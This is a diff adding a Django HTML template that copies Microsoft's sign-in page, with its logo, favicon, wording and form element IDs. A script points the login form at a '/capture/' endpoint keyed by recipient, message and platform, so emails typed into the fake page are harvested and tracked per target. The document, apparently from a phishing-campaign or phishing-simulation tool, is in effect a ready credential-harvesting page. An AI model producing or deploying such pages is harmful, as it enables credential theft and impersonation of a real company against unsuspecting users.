@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign In</title>
+    <link rel="icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
+    <style>
+        body {
+            background: linear-gradient(135deg, #fde9f2, #dceef5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            text-align: left;
+            width: 450px;
+            border-radius: 0;
+        }
+        .logo img {
+            width: 120px;
+        }
+        .title {
+            font-size: 22px;
+            margin-top: 10px;
+            font-weight: bold;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            font-size: 16px;
+            outline: none;
+        }
+        .link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #0078D4;
+        }
+        .link a {
+            color: #0078D4;
+            text-decoration: none;
+        }
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 90px;
+        }
+        .next-button {
+            background: #0078D4;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .next-button:hover {
+            background: #005a9e;
+        }
+        .sign-in-options {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ccc;
+            cursor: pointer;
+            font-size: 16px;
+            background: #f9f9f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 450px;
+            max-width: 450px;
+            flex-shrink: 0;
+        }
+        .sign-in-options img {
+            width: 20px;
+            height: 20px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: gray;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://logincdn.msauth.net/shared/5/js/../images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft">
+        </div>
+        <div class="title">Sign in</div>
+        <form method="POST" id="login-form">
+            {% csrf_token %}
+            <input type="email" id="i0116" name="email" placeholder="Email, phone, or Skype" required>
+            <div class="link">No account? <a href="#" id="signup">Create one!</a></div>
+            <div class="button-container">
+                <button type="submit" id="idSIButton9" class="next-button">Next</button>
+            </div>
+        </form>
+    </div>
+    <div class="sign-in-options">
+        <img src="https://logincdn.msauth.net/shared/5/js/../images/signin_options_4e48046ce74f4b89d450.svg" alt="">
+        <span>Sign-in options</span>
+    </div>
+    <div class="footer">Terms of use • Privacy & cookies</div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const recipientId = "{{ recipient_id }}";  
+        const messageId = "{{ message_id }}";
+        const platform = "{{ platform }}";  // <-- Добавляем platform
+        const BASE_URL = "{{ settings.BASE_URL }}"; 
+    
+        if (recipientId && platform) {
+            document.querySelector("form").action = `${BASE_URL}/capture/${recipientId}/${messageId}/${platform}/`;
+        }
+    </script>
+    
+    
+    
+</body>
+</html>
